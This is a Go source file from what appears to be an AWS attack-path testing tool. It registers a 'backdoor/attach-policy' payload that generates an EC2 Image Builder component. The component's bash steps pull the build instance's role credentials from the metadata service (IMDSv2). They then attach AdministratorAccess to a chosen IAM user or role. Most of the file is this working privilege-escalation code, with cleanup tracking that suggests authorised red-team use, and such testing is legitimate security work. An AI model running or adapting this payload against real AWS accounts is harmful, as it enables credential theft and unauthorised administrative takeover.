// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package imagebuilder

import (
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// BackdoorAttachPolicyPayload generates an EC2 Image Builder component document
// containing shell commands that retrieve admin credentials from IMDS and attach
// a policy to a target IAM user or role. The commands run on the build EC2 instance
// during the Image Builder pipeline execution.
type BackdoorAttachPolicyPayload struct{}

func NewBackdoorAttachPolicyPayload() *BackdoorAttachPolicyPayload {
	return &BackdoorAttachPolicyPayload{}
}

func init() {
	_ = payloads.Register(NewBackdoorAttachPolicyPayload())
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess to an IAM user or role via EC2 Image Builder component using IMDS credentials"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceImageBuilder,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-populated from current identity)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "ARN of the policy to attach (default: AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

// GenerateCode produces an Image Builder component YAML document.
// The YAML contains ExecuteBash steps that retrieve temporary credentials
// from the IMDS endpoint on the build EC2 instance and attach the target policy.
// TARGET_ARN is parsed at generation time to choose the correct IAM command
// (attach-user-policy vs attach-role-policy) since Image Builder component documents
// do not support dynamic parameter injection the way Lambda environment variables do.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	if targetARN == "" {
		return "", fmt.Errorf("TARGET_ARN is required")
	}

	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	principalName, principalType := payloads.PrincipalFromARN(targetARN)

	var attachCmd string
	var flagName string
	if principalType == "role" {
		attachCmd = "attach-role-policy"
		flagName = "--role-name"
	} else {
		attachCmd = "attach-user-policy"
		flagName = "--user-name"
	}

	componentDoc := fmt.Sprintf(`name: PathrunnerExploit
schemaVersion: 1.0
phases:
  - name: build
    steps:
      - name: Exploit
        action: ExecuteBash
        inputs:
          commands:
            - |
              echo "=== Pathrunner Image Builder Exploit Component ==="
              echo "Target %s: %s"
              echo "Policy: %s"

              # Retrieve IMDSv2 token
              TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
                -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
              if [ -z "$TOKEN" ]; then
                echo "FAILED: Could not retrieve IMDSv2 token"
                exit 1
              fi

              # Discover the instance role name from IMDS
              ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
                http://169.254.169.254/latest/meta-data/iam/security-credentials/)
              if [ -z "$ROLE_NAME" ]; then
                echo "FAILED: No IAM role found on this instance"
                exit 1
              fi
              echo "Instance role: $ROLE_NAME"

              # Retrieve temporary credentials from IMDS
              CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")
              export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
              export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
              export AWS_SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['Token'])")
              echo "Credentials loaded (prefix: ${AWS_ACCESS_KEY_ID:0:10}...)"

              # Verify caller identity using the instance role credentials
              aws sts get-caller-identity 2>&1

              # Attach the target policy to the starting principal
              echo "Attaching %s to %s %s ..."
              if aws iam %s %s "%s" \
                  --policy-arn "%s" 2>&1; then
                echo "SUCCESS: Policy attached to %s"
              else
                echo "FAILED: Could not attach policy"
                exit 1
              fi
`, principalType, principalName, policyArn,
		policyArn, principalType, principalName,
		attachCmd, flagName, principalName,
		policyArn, principalName)

	return componentDoc, nil
}

// ProcessResult formats the module result after the image build completes.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// Validate checks that required options are present.
func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// ReportSideEffects returns the policy attachment as a tracked modification so
// the workspace cleanup system can reverse it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	principalName, principalType := payloads.PrincipalFromARN(targetARN)
	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

